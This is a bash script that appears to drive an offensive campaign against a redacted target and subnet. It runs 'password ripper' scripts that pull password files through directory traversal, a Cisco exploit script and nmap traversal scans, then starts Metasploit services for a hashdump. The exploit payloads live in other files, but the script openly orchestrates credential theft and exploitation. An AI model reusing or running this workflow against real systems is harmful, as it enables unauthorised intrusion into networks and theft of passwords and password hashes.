cd /root/Desktop/scripts_REDACTED_TARGET

# backs up previous progress
cat reconresults/nmap_recondo.log >> reconresults/all_log.log
cat directorytraversalscripts/output.log >> reconresults/all_log.log

#echo '' > directorytraversalscripts/output.log

# clears out the separate log files
echo '' > directorytraversalscripts/output.log
echo '' > reconresults/nmap_recondo.log

# tries using the console GET command to pull previously known password locations
echo "Running password rippers"

reconresults/possible_password_locations.sh |& tee -a directorytraversalscripts/output.log &
reconresults/REDACTED_SUBNET_passwordpull.sh |& tee -a directorytraversalscripts/output.log &
reconresults/REDACTED_SUBNET_passwordpull2.sh |& tee -a directorytraversalscripts/output.log &
reconresults/REDACTED_SUBNET_passwordpull3.sh |& tee -a directorytraversalscripts/output.log &
exploits/cisco_exploits/exploit_cisco.sh |& tee -a directorytraversalscripts/output.log &
# tries using the WGET command instead

reconresults/wget_possible_password_locations.sh |& tee -a directorytraversalscripts/output.log

# runs Dot Dot Pwn against all known targets with HTTP servers
#./DotDotPwnScript.sh
#dnauto_nmap_scans/traversal_recon.sh
#attack_script_nov_10.sh
echo "Keep this screen open! All output has been copied to reconresults/nmap_recondo.log and directorytraversalscripts/output.log"
echo "Open a new terminal and run DotDotPwn script"
# runs several nmap modules at once using all five known directory traversal vulnerabilities in nmap
dnauto_nmap_scans/traversal_recon.sh |& tee -a reconresults/nmap_recondo.log
#directorytraversalscripts/dotdotpwnscript.sh |& tee -a directorytraversalscripts/output.log
#scripts_REDACTED_TARGET/reconresults/possible_password_locations.sh |& tee -a directorytraversalscripts/output.log
#scripts_REDACTED_TARGET/reconresults/wget_possible_password_locations.sh |& tee -a directorytraversalscripts/output.log
#scripts_REDACTED_TARGET/reconresults/test_possible_password_locations.sh |& tee -a directorytraversalscripts/test_possible_password_locations_output.log

# start up metasploit services
echo "Metasploit services starting, need to run msfconsole -r hashdump"
service postgresql start
service metasploit start
msfdb init
msfdb start
#screen -S metasploit
#echo "Screened to Metasploit, use Ctrl + A + D to background"

# we cant use this, because the console becomes unresponsive
#msfconsole -r hashdump.rc
